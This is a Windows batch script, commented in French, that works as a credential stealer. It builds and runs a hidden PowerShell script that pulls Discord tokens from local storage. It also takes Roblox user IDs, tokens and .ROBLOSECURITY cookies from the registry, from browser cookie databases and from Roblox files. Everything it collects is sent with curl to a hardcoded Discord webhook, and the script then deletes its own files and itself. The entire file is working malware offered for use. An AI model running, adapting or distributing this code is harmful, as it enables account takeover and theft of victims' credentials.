@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION ULTIME (TOUS LES EMPLACEMENTS)

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 1 : CREATION DU SCRIPT POWERSHELL COMPLET
set "psfile=%TEMP%\ultra_extract.ps1"
set "outfile=%TEMP%\ultra_result.txt"
(
echo # ---------------------------------------------------------------
echo # 1. RECHERCHE DES TOKENS DISCORD
echo # ---------------------------------------------------------------
echo $discordPaths = @(
echo     "$env:APPDATA\Discord\Local Storage\leveldb",
echo     "$env:APPDATA\discordptb\Local Storage\leveldb",
echo     "$env:APPDATA\discordcanary\Local Storage\leveldb"
echo )
echo $tokens = @()
echo $discordPattern = '[a-zA-Z0-9_\-]{20,60}\.[a-zA-Z0-9_\-]{6,20}\.[a-zA-Z0-9_\-]{20,80}'
echo foreach ($p in $discordPaths) {
echo     if (Test-Path $p) {
echo         Get-ChildItem $p -File ^| ForEach-Object {
echo             Select-String -Path $_.FullName -Pattern $discordPattern -AllMatches ^| ForEach-Object { $_.Matches.Value }
echo         } ^| ForEach-Object { $tokens += $_ }
echo     }
echo }
echo $tokens = $tokens ^| Select-Object -Unique
echo $discordResult = $tokens -join ' '
echo.
echo # ---------------------------------------------------------------
echo # 2. RECHERCHE ROBLOX - REGISTRE
echo # ---------------------------------------------------------------
echo $robloxUser = $null
echo $robloxRemember = $null
echo try {
echo     $robloxUser = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "UserID" -ErrorAction SilentlyContinue).UserID
echo } catch {}
echo try {
echo     $robloxRemember = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "RememberMe" -ErrorAction SilentlyContinue).RememberMe
echo } catch {}
echo.
echo # ---------------------------------------------------------------
echo # 3. RECHERCHE ROBLOX - FICHIER XML GLOBAL
echo # ---------------------------------------------------------------
echo $robloxXmlToken = $null
echo $xmlPath = "$env:LOCALAPPDATA\Roblox\GlobalBasicSettings_13.xml"
echo if (Test-Path $xmlPath) {
echo     try {
echo         $xml = [xml](Get-Content $xmlPath -ErrorAction SilentlyContinue)
echo         if ($xml -and $xml.settings -and $xml.settings.token) {
echo             $robloxXmlToken = $xml.settings.token
echo         }
echo     } catch {}
echo }
echo.
echo # ---------------------------------------------------------------
echo # 4. RECHERCHE ROBLOX - COOKIE .ROBLOSECURITY DANS LES NAVIGATEURS (SQLite)
echo # ---------------------------------------------------------------
echo $robloxCookie = $null
echo $browserDbs = @(
echo     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
echo     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
echo     "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite",
echo     "$env:APPDATA\Opera Software\Opera Stable\Network\Cookies"
echo )
echo # Tentative avec SQLite (si assembly disponible)
echo try {
echo     Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
echo     foreach ($db in $browserDbs) {
echo         $path = $db -replace '\*',''   # simplification pour Firefox
echo         if (Test-Path $path) {
echo             $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$path")
echo             $conn.Open()
echo             $cmd = $conn.CreateCommand()
echo             $cmd.CommandText = "SELECT value FROM cookies WHERE host_key LIKE '%%roblox.com%%' AND name = '.ROBLOSECURITY'"
echo             $reader = $cmd.ExecuteReader()
echo             if ($reader.Read()) {
echo                 $robloxCookie = $reader.GetString(0)
echo                 $reader.Close()
echo                 $conn.Close()
echo                 break
echo             }
echo             $reader.Close()
echo             $conn.Close()
echo         }
echo     }
echo } catch {
echo     # SQLite non disponible, fallback sur fichiers texte
echo }
echo.
echo # ---------------------------------------------------------------
echo # 5. FALLBACK : COOKIE DANS LES FICHIERS TEXTE (IE/Edge legacy)
echo # ---------------------------------------------------------------
echo if ($robloxCookie -eq $null) {
echo     $cookiePaths = @(
echo         "$env:APPDATA\Microsoft\Windows\Cookies",
echo         "$env:LOCALAPPDATA\Microsoft\Windows\INetCookies"
echo     )
echo     foreach ($cp in $cookiePaths) {
echo         if (Test-Path $cp) {
echo             Get-ChildItem $cp -Filter *.txt ^| ForEach-Object {
echo                 Select-String -Path $_.FullName -Pattern 'ROBLOSECURITY=[^;]+' ^| ForEach-Object { $_.Matches.Value }
echo             } ^| ForEach-Object {
echo                 $val = $_ -replace 'ROBLOSECURITY=',''
echo                 if ($val -match '^[a-zA-Z0-9_\-]+$') { $robloxCookie = $val }
echo             }
echo         }
echo     }
echo }
echo.
echo # ---------------------------------------------------------------
echo # 6. RECHERCHE DANS LES FICHIERS DU DOSSIER ROBLOX (tout fichier)
echo # ---------------------------------------------------------------
echo $robloxFileToken = $null
echo $robloxDirs = @(
echo     "$env:LOCALAPPDATA\Roblox",
echo     "$env:APPDATA\Roblox"
echo )
echo $tokenRegex = '[a-zA-Z0-9_\-]{30,70}'
echo foreach ($dir in $robloxDirs) {
echo     if (Test-Path $dir) {
echo         Get-ChildItem $dir -Recurse -File -ErrorAction SilentlyContinue ^| ForEach-Object {
echo             Select-String -Path $_.FullName -Pattern $tokenRegex -AllMatches ^| ForEach-Object { $_.Matches.Value }
echo         } ^| ForEach-Object {
echo             if ($_ -match '^[a-zA-Z0-9_\-]+$' -and $_.Length -gt 30) {
echo                 $robloxFileToken = $_
echo             }
echo         }
echo     }
echo }
echo.
echo # ---------------------------------------------------------------
echo # 7. CONSTRUCTION DU MESSAGE
echo # ---------------------------------------------------------------
echo $msg = ""
echo if ($discordResult -ne "") { $msg += "=== TOKENS DISCORD ===`n$discordResult`n`n" }
echo if ($robloxCookie -ne $null -and $robloxCookie -ne "") { $msg += "=== ROBLOX COOKIE (.ROBLOSECURITY) ===`n$robloxCookie`n`n" }
echo if ($robloxXmlToken -ne $null -and $robloxXmlToken -ne "") { $msg += "=== ROBLOX TOKEN (XML) ===`n$robloxXmlToken`n`n" }
echo if ($robloxFileToken -ne $null -and $robloxFileToken -ne "") { $msg += "=== ROBLOX TOKEN (FICHIER) ===`n$robloxFileToken`n`n" }
echo if ($robloxUser -ne $null -and $robloxUser -ne "") { $msg += "=== ROBLOX UserID ===`n$robloxUser`n`n" }
echo if ($robloxRemember -ne $null -and $robloxRemember -ne "") { $msg += "=== ROBLOX RememberMe ===`n$robloxRemember`n`n" }
echo if ($msg -eq "") { $msg = "Aucune donnee collectee.`n" }
echo $msg ^| Out-File -FilePath '%outfile%' -Encoding utf8
) > "%psfile%"

:: ETAPE 2 : EXECUTION DU POWERSHELL (TOUTES SORTIES REDIRIGEES)
powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2>nul

:: ETAPE 3 : LECTURE DU RESULTAT
set "msg="
if exist "%outfile%" (
    for /f "usebackq delims=" %%a in ("%outfile%") do set "msg=%%a"
    del /f /q "%outfile%" >nul 2>&1
)
del /f /q "%psfile%" >nul 2>&1

:: ETAPE 4 : SI VIDE, MESSAGE PAR DEFAUT
if "!msg!"=="" set "msg=Aucune donnee collectee.\n"

:: ETAPE 5 : ECHAPPEMENT JSON
set "msg=!msg:"=\"!"
set "msg=!msg:\n=\\n!"

:: ETAPE 6 : ENVOI VIA CURL
curl -s -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" >nul 2>&1

:: ETAPE 7 : NETTOYAGE
set "msg="
del /f /q "%~f0" >nul 2>&1
exit /b 0
